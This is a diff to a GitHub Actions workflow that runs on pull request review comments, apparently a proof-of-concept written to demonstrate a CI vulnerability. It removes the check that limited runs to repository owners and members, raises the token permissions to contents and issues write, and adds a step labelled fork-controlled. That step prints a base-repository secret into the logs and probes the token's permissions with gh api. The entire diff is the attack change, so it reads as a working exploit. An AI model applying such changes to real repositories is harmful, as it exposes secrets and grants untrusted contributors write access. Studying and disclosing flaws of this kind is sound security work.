@@ -3,64 +3,21 @@ on:
   pull_request_review_comment:
     types: [created]
 permissions:
-  contents: read
+  contents: write
   pull-requests: write
+  issues: write
 jobs:
-  diag-ungated:
+  no-gate:
     runs-on: ubuntu-latest
     steps:
-      - name: dump payload
-        run: |
-          echo "event_name=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA"
-          echo "comment.author_association raw: [$(jq -r '.comment.author_association' "$GITHUB_EVENT_PATH")]"
-          echo "comment.user.login: [$(jq -r '.comment.user.login' "$GITHUB_EVENT_PATH")]"
-          echo "pull_request.base.ref: [$(jq -r '.pull_request.base.ref' "$GITHUB_EVENT_PATH")]"
-      - uses: actions/checkout@v6
-      - name: identity
-        run: |
-          echo "HEAD=$(git rev-parse HEAD) parents=$(git log -1 --pretty=%P)"
-          git log -1 --oneline
-          echo "--- PR-head prompt file in workspace ---"
-          cat .github/prompts/code-review.md
-  probe:
-    if: |
-      (
-        (github.event_name == 'pull_request_review_comment' && contains(github.event.comment.body, '@claude'))
-      ) && (
-        github.event.comment.author_association == 'OWNER' ||
-        github.event.comment.author_association == 'MEMBER'
-      )
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-      - name: Checkout identity
-        run: |
-          echo "author_association=${{ github.event.comment.author_association }}"
-          echo "GITHUB_REF=$GITHUB_REF GITHUB_SHA=$GITHUB_SHA"
-          echo "HEAD=$(git rev-parse HEAD) parents=$(git log -1 --pretty=%P)"
-          git log -1 --oneline
-          echo "--- .github/prompts/code-review.md in workspace ---"
-          cat .github/prompts/code-review.md
-      - name: Determine prompt to use
-        id: determine-prompt
+      - name: fork-controlled workflow step
         env:
-          COMMENT_BODY: ${{ github.event.comment.body }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          TRIMMED_COMMENT=$(echo "$COMMENT_BODY" | xargs)
-          if [ "$TRIMMED_COMMENT" = "@claude" ]; then
-            echo "use-code-review-prompt=true" >> "$GITHUB_OUTPUT"
-          else
-            echo "use-code-review-prompt=false" >> "$GITHUB_OUTPUT"
-          fi
-      - name: Read code review prompt
-        id: read-prompt
-        if: steps.determine-prompt.outputs.use-code-review-prompt == 'true'
-        run: |
-          PROMPT_CONTENT=$(cat .github/prompts/code-review.md)
-          {
-            echo "prompt-content<<EOF"
-            echo "$PROMPT_CONTENT"
-            echo "EOF"
-          } >> "$GITHUB_OUTPUT"
-          echo "=== VALUE THAT TARGET FEEDS INTO prompt: ==="
-          printf '%s\n' "$PROMPT_CONTENT"
+          echo "SECRET_FROM_BASE_REPO=[${{ secrets.POC_MARKER_SECRET }}]"
+          echo "actor=${{ github.actor }} association=${{ github.event.comment.author_association }}"
+          echo "ref=$GITHUB_REF"
+          echo "head repo is fork: ${{ github.event.pull_request.head.repo.fork }}"
+          echo "base repo: ${{ github.repository }}"
+          echo "--- token perms ---"
+          gh api repos/${{ github.repository }} --jq '.permissions' || true
